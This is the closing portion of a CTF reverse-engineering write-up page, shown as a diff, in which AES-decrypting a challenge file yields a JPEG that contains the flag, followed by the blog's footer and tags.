+</span></span><span style="display:flex;"><span><span style="color:#111">plaintext</span> <span style="color:#f92672">=</span> <span style="color:#111">unpad</span><span style="color:#111">(</span><span style="color:#111">cipher</span><span style="color:#f92672">.</span><span style="color:#111">decrypt</span><span style="color:#111">(</span><span style="color:#111">data</span><span style="color:#111">),</span> <span style="color:#111">AES</span><span style="color:#f92672">.</span><span style="color:#111">block_size</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#d88200">&#39;dec&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;wb&#39;</span><span style="color:#111">)</span><span style="color:#f92672">.</span><span style="color:#111">write</span><span style="color:#111">(</span><span style="color:#111">plaintext</span><span style="color:#111">)</span>
+</span></span></code></pre></div><p>running file on dec we see that it is an image:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file dec
+</span></span><span style="display:flex;"><span>dec: JPEG image data, baseline, precision 8, 1280x720, components <span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><p>viewing it gives us the flag:
+<img
+  src="/alpaca-bside-stealerusk/dec.jpeg"
+  alt="flag image"
+  loading="lazy"
+  decoding="async"
+  class="full-width"
+/>
+
+</p>
+
+      
+      <div class="post-date">
+        <span class="g time">June 28, 2026 </span> &#8729;
+         
+         <a href="https://nothoudaifa.github.io/tags/ctf/">ctf</a> <a href="https://nothoudaifa.github.io/tags/rev/">rev</a> <a href="https://nothoudaifa.github.io/tags/windows/">windows</a>
+      </div>
+      
+    </section>
+    
+    
+    
+  </div>
+</main>
+</body>
+</html>
